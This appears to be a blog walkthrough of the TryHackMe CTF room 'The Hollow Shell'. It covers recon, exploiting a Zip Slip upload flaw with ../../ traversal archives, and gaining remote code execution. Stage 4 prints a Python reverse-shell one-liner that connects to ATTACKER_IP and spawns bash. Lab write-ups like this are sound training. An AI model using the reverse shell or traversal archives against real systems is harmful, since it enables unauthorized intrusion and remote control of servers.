Breaking Down The Hollow Shell – A CTF Walkthrough with Insights
==============================
Capture the Flag (CTF) challenges are more than just puzzles; they’re opportunities to sharpen real-world penetration testing skills. In this post, I’ll walk through my exploitation of The Hollow Shell from TryHackMe, highlighting not just the steps but the reasoning, risks, and lessons behind them.


🌐 Stage 1: Initial Reconnaissance
----------------------------------
The first step in any engagement is reconnaissance. Using Nmap, I scanned the target:
```
nmap -sS -Pn -p- TARGET_IP
```
Findings:
- Port 22 (SSH) open
- Port 5000 open, running a web service (Gunicorn server)

🕸 Stage 2: Web Reconnaissance
------------------------------
Visiting
```
http://TARGET_IP:5000
```
<img width="896" height="337" alt="hollow_shell_1_web_home" src="https://github.com/user-attachments/assets/72787562-ba37-4862-97ea-9eefd90b0b26" />

revealed a simple web interface. Viewing the source code exposed hardcoded credentials — a classic mistake.

<img width="573" height="332" alt="hollow_shell_1_web_login_source" src="https://github.com/user-attachments/assets/ecf3fac9-0b11-4b63-908f-3a61b45a253f" />

📦 Stage 3: Exploiting Zip Slip Vulnerability
---------------------------------------------
The application allowed file uploads. By experimenting with crafted ZIP archives, I discovered a Zip Slip vulnerability — the ability to traverse directories during extraction.

Steps:
- Created a harmless HTML file and JSON manifest.
```
mkdir static;
echo "<h1>this is html demo</h1>" > static/zip_css.html
mkdir test;cd test;mkdir test2; cd test2
printf '%s\n' '{"name":"test","assets":[]}' > shell.json
```
- Packaged them into a ZIP with relative paths (../../) to escape the intended directory.
```
zip zip_css.zip ../../static/zip_css.html
zip zip_css.zip shell.json
```
- Uploaded and confirmed successful placement of files outside the designated folder.

<img width="638" height="164" alt="hollow_shell_1_shell_json" src="https://github.com/user-attachments/assets/288ec319-702e-49c9-9bc3-5d21b7f30f69" />

<img width="749" height="176" alt="hollow_shell_1_static_css" src="https://github.com/user-attachments/assets/d0628418-2bdc-415a-b09d-b5bca91a001b" />

⚡ Stage 4: Remote Code Execution (RCE)
---------------------------------------

<img width="593" height="248" alt="hollow_shell_1_hooks" src="https://github.com/user-attachments/assets/dbec9d8b-a0c3-4768-97c5-3429fe455abf" />

Building on the Zip Slip, I escalated to RCE:
```
mkdir hooks; cd hooks
```
- Crafted a Python reverse shell (zip_rce.py).
```
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT_NUM));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);
```
- Packaged it into a ZIP with traversal paths pointing to the application’s hooks directory.
```
cd test/test2/
zip zip_rce.zip ../../hooks/zip_rce.py
zip zip_rce.zip shell.json
```
- Uploaded and triggered execution, gaining a shell on the target.

🏁 Final Stage: Flag Capture
----------------------------
With RCE established, I accessed the system, navigated to the challenge directory, and retrieved the flag — completing the CTF.

<img width="537" height="325" alt="hollow_shell_1_roomservice" src="https://github.com/user-attachments/assets/b4c9ebb3-6ec5-48af-a4d2-84cc16509ec2" />

🔍 Key Takeaways
----------------
- Recon is king: Nmap revealed the unusual port that became the entry point.
- Never trust uploads: File upload functionality is a goldmine for attackers.
- Defense in depth matters: Even if Zip Slip was exploitable, proper sandboxing or execution restrictions could have prevented RCE.
- Think like a developer: Understanding how applications handle files helps anticipate vulnerabilities.
